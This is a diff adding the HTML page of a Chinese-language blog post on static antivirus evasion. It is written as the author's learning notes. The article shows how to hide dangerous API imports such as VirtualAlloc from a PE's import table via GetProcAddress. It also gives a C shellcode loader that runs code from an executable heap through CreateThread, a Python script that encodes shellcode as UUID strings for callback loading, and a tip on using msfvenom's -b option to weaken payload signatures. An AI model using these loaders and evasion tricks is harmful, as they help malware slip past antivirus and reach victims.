@@ -1,0 +1,671 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Glacier">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="静态恶意代码逃逸3最近在学习从底层用C&#x2F;C++去实现免杀，而看到了关于静态恶意代码逃逸的一些很好的文章，在此记录总结一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="静态恶意代码逃逸3">
+<meta property="og:url" content="https://silver-glacier.github.io/2022/10/20/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B83/index.html">
+<meta property="og:site_name" content="Glacier&#39;s Blog">
+<meta property="og:description" content="静态恶意代码逃逸3最近在学习从底层用C&#x2F;C++去实现免杀，而看到了关于静态恶意代码逃逸的一些很好的文章，在此记录总结一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/10/20/RMhZQGt4ijUYedr.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/20/GxKI6VnmOcD9WAL.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/20/vOoGBN12nH5qWMt.png">
+<meta property="article:published_time" content="2022-10-20T08:49:24.000Z">
+<meta property="article:modified_time" content="2022-10-20T13:02:56.195Z">
+<meta property="article:author" content="Glacier">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2022/10/20/RMhZQGt4ijUYedr.png">
+  
+  
+  
+  <title>静态恶意代码逃逸3 - Glacier&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"silver-glacier.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="静态恶意代码逃逸3"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-20 16:49" pubdate>
+          2022年10月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          32 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">静态恶意代码逃逸3</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="静态恶意代码逃逸3"><a href="#静态恶意代码逃逸3" class="headerlink" title="静态恶意代码逃逸3"></a>静态恶意代码逃逸3</h1><p>最近在学习从底层用C/C++去实现免杀，而看到了关于静态恶意代码逃逸的一些很好的文章，在此记录总结一下</p>
+<a id="more"></a>
+
+<h3 id="调用自己函数隐藏导入表"><a href="#调用自己函数隐藏导入表" class="headerlink" title="调用自己函数隐藏导入表"></a>调用自己函数隐藏导入表</h3><h4 id="Import-Address-Table（IAT）"><a href="#Import-Address-Table（IAT）" class="headerlink" title="Import Address Table（IAT）"></a>Import Address Table（IAT）</h4><p>在上一篇文章中，我们对于PE文件的结构有了一定的了解<br>而PE文件的导入表(IAT)将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)<br>见而言之就是PE利用导入表来找外部函数地址</p>
+<p>这里没找到原文中的工具，于是自己找了一个工具,用来查看程序中的导入表<br><a target="_blank" rel="noopener" href="https://github.com/oxiKKK/iat-dump">IAT-dump</a></p>
+<p>对于这个工具，也可能是自己没怎么接触过C++20，于是折腾了挺久才跑起来</p>
+<p>根据main.cpp中的这一段代码可以知道，需要我们传一点参数进去<br><img src="https://s2.loli.net/2022/10/20/RMhZQGt4ijUYedr.png" srcset="/img/loading.gif" lazyload alt="main.cpp"></p>
+<p>而对于main函数中传递参数<code>int main(int argc, char** argv)</code><br>其中argc记录的是参数的个数，argv则是按顺序存储了传入的参数</p>
+<p>那我们第一步先将调试模式改成release，这样编译后会存在一个iat-dump.exe<br><code> .\iat-dump.exe -file evil.exe</code><br>这样即可查看evil.exe的导入表（evil.exe得在当前目录下）<br><img src="https://s2.loli.net/2022/10/20/GxKI6VnmOcD9WAL.png" srcset="/img/loading.gif" lazyload></p>
+<p><em>在找工具的时候，也发现了一个比较好玩的东西，不过还没仔细去看，先记录一下 <a target="_blank" rel="noopener" href="https://github.com/fdgnneig/ShellProgram">https://github.com/fdgnneig/ShellProgram</a></em></p>
+<h4 id="获取函数地址"><a href="#获取函数地址" class="headerlink" title="获取函数地址"></a>获取函数地址</h4><p>这个API在Kernel32.dll中有一个函数<code>GetProcAddress</code>被导出，主要功能是从一个加载的模块中获取函数的地址<br>其能返回一个我们需要找的函数的地址，我们就需要利用这个函数，来自己手动获取函数地址，这样就不会使危险的函数出现在IAT中<br>因为杀软会对导入表中的某些函数（例如VirtualAlloc函数基于可执行权限时，会直接报毒查杀）特别关注</p>
+<p>我们定义一些函数指针来存放函数的地址<br><code>ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(&quot;kernel32.dll&quot;)), &quot;VirtualAlloc&quot;);</code></p>
+<p>编译通过后，自定义的函数时不会出现在导入表中的，这样就减少了文件特征</p>
+<h3 id="重载运算符"><a href="#重载运算符" class="headerlink" title="重载运算符"></a>重载运算符</h3><p>一般情况下，C/C++程序中的字符串常量会被硬编码到程序中（.data段，也就是数据段），尤其是全局变量最容易被定位到<br>于是想到使用重载运算符来将string重载，再进行编码等一系列操作<br>这里有个项目已经实现了，重载运算符的原理比较容易理解，就不做多叙述了<br><a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/Cooolis-ms">https://github.com/Rvn0xsy/Cooolis-ms</a></p>
+<h3 id="绕过DEP"><a href="#绕过DEP" class="headerlink" title="绕过DEP"></a>绕过DEP</h3><h4 id="什么是DEP"><a href="#什么是DEP" class="headerlink" title="什么是DEP"></a>什么是DEP</h4><p>在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限制某些内存页不具有可执行权限</p>
+<h4 id="绕过DEP-1"><a href="#绕过DEP-1" class="headerlink" title="绕过DEP"></a>绕过DEP</h4><p>VirtualProtect这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为VirtualProtect的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从”不可执行”变成”可执行”<br>由此说来，Shellcode执行其实也需要一个可执行的内存页，<br>于是我们找到了一个API  HeapCreate可以在进程中创建辅助堆栈，并且能够设置堆栈的属性</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">HANDLE WINAPI <span class="hljs-title">HeapCreate</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">__in DWORD flOptions,</span></span><br><span class="hljs-function"><span class="hljs-params">__in SIZE_T dwInitialSize,</span></span><br><span class="hljs-function"><span class="hljs-params">__in SIZE_T dwMaximumSize )</span></span>;<br></code></pre></td></tr></table></figure>
+
+<p>对于第一个参数</p>
+<ol>
+<li>HEAP_NO_SERIALIZE：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用</li>
+<li>HEAP_GENERATE_EXCEPTIONS：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL</li>
+<li>HEAP_CREATE_ENALBE_EXECUTE：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据<br>我们的思路就是将shellcode存入到这个辅助进程中<br>直接贴上示例代码<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">char</span> shellcode[] = <span class="hljs-string">&quot;123&quot;</span>;<br><br>	HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>	PVOID Mptr = HeapAlloc(hHep, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>	RtlCopyMemory(Mptr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>	DWORD dwThreadId = <span class="hljs-number">0</span>;<br>	HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)Mptr, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;dwThreadId);<br>	WaitForSingleObject(hThread, INFINITE);<br><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Hello World!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="Bin2UUID"><a href="#Bin2UUID" class="headerlink" title="Bin2UUID"></a>Bin2UUID</h3><p>这是通过唯一标识符（universally unique identifier, UUID）来存储shellcode，并使用CALL BACK函数的特性来加载Shellcode<br>这里直接贴上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> UUID<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Usage: python3 binToUUIDs.py shellcode.bin [--print]</span><br><br>print(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">  ____  _    _______    _    _ _    _ _____ _____       </span><br><span class="hljs-string"> |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      </span><br><span class="hljs-string"> | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  </span><br><span class="hljs-string"> |  _ &lt;| | &#x27;_ \| |/ _ \| |  | | |  | | | | | |  | / __| </span><br><span class="hljs-string"> | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ </span><br><span class="hljs-string"> |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/</span><br><span class="hljs-string">\n&quot;&quot;&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">bin</span> = f.read()<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">2</span>] == <span class="hljs-string">&quot;--print&quot;</span>:<br>    outputMapping = <span class="hljs-literal">True</span><br><span class="hljs-keyword">else</span>:<br>    outputMapping = <span class="hljs-literal">False</span><br><br>offset = <span class="hljs-number">0</span><br><br>print(<span class="hljs-string">&quot;Length of shellcode: &#123;&#125; bytes\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>)))<br><br>out = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">while</span>(offset &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>)):<br>    countOfBytesToConvert = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>[offset:])<br>    <span class="hljs-keyword">if</span> countOfBytesToConvert &lt; <span class="hljs-number">16</span>:<br>        ZerosToAdd = <span class="hljs-number">16</span> - countOfBytesToConvert<br>        byteString = <span class="hljs-built_in">bin</span>[offset:] + (<span class="hljs-string">b&#x27;\x00&#x27;</span>* ZerosToAdd)<br>        uuid = UUID(bytes_le=byteString)<br>    <span class="hljs-keyword">else</span>:<br>        byteString = <span class="hljs-built_in">bin</span>[offset:offset+<span class="hljs-number">16</span>]<br>        uuid = UUID(bytes_le=byteString)<br>    offset+=<span class="hljs-number">16</span><br><br>    out += <span class="hljs-string">&quot;\&quot;&#123;&#125;\&quot;,\n&quot;</span>.<span class="hljs-built_in">format</span>(uuid)<br>    <br>    <span class="hljs-keyword">if</span> outputMapping:<br>        print(<span class="hljs-string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(byteString, uuid))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;UUIDs&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(out)<br><br>print(<span class="hljs-string">&quot;Outputted to: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;UUIDs&quot;</span>))<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/10/20/vOoGBN12nH5qWMt.png" srcset="/img/loading.gif" lazyload alt="成功执行"></p>
+<p>记录一个新学的点，msfvenom生成木马时，可以用-b去避免所生成的shell中包含的字符<br>通常是-b ‘\xfc\xe8’或者-b ‘\x00’来减小msf码的文件特征</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%85%8D%E6%9D%80/" class="category-chain-item">免杀</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>静态恶意代码逃逸3</div>
+      <div>https://silver-glacier.github.io/2022/10/20/静态恶意代码逃逸3/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Glacier</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年10月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/19/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B82/" title="静态恶意代码逃逸2">
+                        <span class="hidden-mobile">静态恶意代码逃逸2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
